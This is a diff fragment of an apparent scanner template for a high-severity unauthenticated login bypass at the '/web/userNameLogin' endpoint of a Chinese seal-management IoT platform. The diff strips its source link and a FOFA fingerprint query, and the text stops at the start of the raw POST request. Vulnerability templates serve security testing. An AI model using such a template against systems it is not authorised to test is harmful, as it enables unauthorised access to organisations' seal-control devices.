@@ -3,12 +3,8 @@ info:
   name: 群杰印章物联网平台userNameLogin存在登录绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zhhxr7t2fz55n8km'
+  description: ''
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zhhxr7t2fz55n8km
-    fofa: body="群杰印章物联网平台"
 http:
 - raw:
   - 'POST /web/userNameLogin HTTP/1.1
